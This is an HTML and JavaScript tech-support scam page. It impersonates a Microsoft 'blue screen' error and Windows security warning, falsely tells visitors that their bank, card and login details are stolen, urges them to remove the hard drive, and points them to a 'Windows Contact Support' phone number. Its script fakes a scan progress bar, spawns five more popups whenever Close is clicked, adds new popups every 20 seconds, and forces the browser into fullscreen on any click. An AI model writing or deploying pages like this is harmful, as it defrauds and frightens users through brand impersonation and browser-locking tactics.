<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Windows Security Warning</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: #1a1a1a;
      color: #fff;
      transition: background 0.3s ease;
    }
    .popup-container {
      position: fixed;
      background: #2b2b2b;
      border: 3px solid #444;
      border-radius: 10px;
      box-shadow: 0px 0px 20px rgba(0,0,0,0.8);
      width: 650px;
      max-width: 90%;
      z-index: 9999;
      user-select: none;
      padding: 10px;
      animation: zoomIn 0.5s ease;
    }
    .popup {
      display: flex;
      flex-direction: row;
    }
    .left-panel, .right-panel {
      padding: 20px;
      flex: 1;
    }
    .sad-face {
      font-size: 50px;
      margin-bottom: 10px;
    }
    .main-message {
      font-size: 16px;
      margin-bottom: 20px;
    }
    .qr-block {
      text-align: center;
    }
    .qr-block img {
      width: 120px;
    }
    .ms-logo {
      display: flex;
      align-items: center;
      margin-bottom: 15px;
    }
    .ms-square {
      width: 15px;
      height: 15px;
      margin-right: 3px;
      display: inline-block;
    }
    .ms-red { background: red; }
    .ms-green { background: green; }
    .ms-blue { background: blue; }
    .ms-yellow { background: yellow; }
    .ms-text { margin-left: 10px; font-weight: bold; }
    .warning-text {
      font-size: 15px;
      margin-bottom: 15px;
      animation: blink 1.2s infinite;
    }
    @keyframes blink {
      0% { color: #fff; }
      50% { color: yellow; }
      100% { color: #fff; }
    }
    .black-box {
      background: black;
      color: #fff;
      padding: 10px;
      margin-bottom: 15px;
      text-align: center;
    }
    .scan-report {
      background: #111;
      padding: 10px;
      border-radius: 5px;
      text-align: center;
    }
    .scan-report .percent {
      font-size: 18px;
      margin-top: 5px;
    }
    .progress-bar {
      width: 100%;
      height: 10px;
      background: #333;
      border-radius: 5px;
      margin-top: 10px;
      overflow: hidden;
    }
    .progress-bar-fill {
      width: 0%;
      height: 100%;
      background: lime;
      transition: width 0.3s ease;
    }
    .close-btn {
      background: red;
      color: #fff;
      border: none;
      padding: 8px 15px;
      cursor: pointer;
      border-radius: 5px;
      margin-top: 15px;
    }
    @keyframes zoomIn {
      from { transform: scale(0.3); opacity: 0; }
      to { transform: scale(1); opacity: 1; }
    }
    @keyframes fadeIn {
      from { opacity: 0; transform: scale(0.7); }
      to { opacity: 1; transform: scale(1); }
    }
    @keyframes rotateIn {
      from { opacity: 0; transform: rotate(-200deg) scale(0.3); }
      to { opacity: 1; transform: rotate(0) scale(1); }
    }
  </style>
</head>
<body>
  <script>
    const animations = ['zoomIn', 'fadeIn', 'rotateIn'];
    const colors = ['#1a1a1a', '#222', '#330000', '#003300', '#000033', '#333300', '#660066', '#444'];

    function createPopup() {
      const popup = document.createElement('div');
      popup.className = 'popup-container';
      popup.style.animation = animations[Math.floor(Math.random() * animations.length)] + ' 0.5s ease';

      popup.innerHTML = `
        <div class="popup">
          <div class="left-panel">
            <div class="sad-face">:(</div>
            <div class="main-message">
              Your PC has encountered a problem and needs troubleshooting.<br>
              Simply collect error information and the troubleshooting will be performed for you.
            </div>
            <div class="qr-block">
              <img src="https://api.qrserver.com/v1/create-qr-code/?size=120x120&data=Support" alt="QR Code">
              <div class="qr-text">
                For more information about this issue and the solution,<br>
                Call: +1-818-394-0622<br><br>
                Stop code: <strong>CRITICAL_PROCESS_DIED</strong>
              </div>
            </div>
          </div>
          <div class="right-panel">
            <div class="ms-logo">
              <div class="ms-square ms-red"></div>
              <div class="ms-square ms-green"></div>
              <div class="ms-square ms-blue"></div>
              <div class="ms-square ms-yellow"></div>
              <span class="ms-text">Microsoft</span>
            </div>
            <div class="warning-text">
              Someone has your login<br>
              Bank account information, credit card information<br>
              & Other logins.<br><br>
              <strong>Your data is at high risk</strong><br>
              <span class="highlight-yellow">Remove hard drive for safety<br>It's starting soon ..</span>
            </div>
            <div class="black-box">
              Windows Contact Support<br>
              +1-818-394-0622
            </div>
            <div class="scan-report">
              <div class="label">Scan Report</div>
              <div class="percent">0%</div>
              <div class="progress-bar">
                <div class="progress-bar-fill"></div>
              </div>
            </div>
            <button class="close-btn">Close</button>
          </div>
        </div>
      `;

      document.body.appendChild(popup);

      // random position
      movePopupRandom(popup);

      // background color flash
      flashBackground();

      // progress bar
      let percent = 0;
      const percentEl = popup.querySelector('.percent');
      const fillEl = popup.querySelector('.progress-bar-fill');
      const progressTimer = setInterval(() => {
        if (percent < 100) {
          percent++;
          percentEl.innerText = percent + "%";
          fillEl.style.width = percent + "%";
        } else {
          clearInterval(progressTimer);
        }
      }, 200);

      // close button crazy mode
      popup.querySelector('.close-btn').addEventListener('click', () => {
        document.body.removeChild(popup);
        for (let i = 0; i < 5; i++) {
          createPopup();
        }
        playSound();
      });
    }

    function movePopupRandom(popup) {
      const x = Math.random() * (window.innerWidth - 660);
      const y = Math.random() * (window.innerHeight - 400);
      popup.style.left = x + 'px';
      popup.style.top = y + 'px';
    }

    function flashBackground() {
      document.body.style.background = colors[Math.floor(Math.random() * colors.length)];
    }

    function playSound() {
      const audio = new Audio('https://actions.google.com/sounds/v1/cartoon/clang_and_wobble.ogg');
      audio.play();
    }

    // Initial spawn
    createPopup();

    // auto spawn every 20s
    setInterval(createPopup, 20000);

    // Fullscreen trap
    document.addEventListener("click", () => {
      if (!document.fullscreenElement) {
        document.documentElement.requestFullscreen().catch(()=>{});
      }
    });
  </script>
</body>
</html>
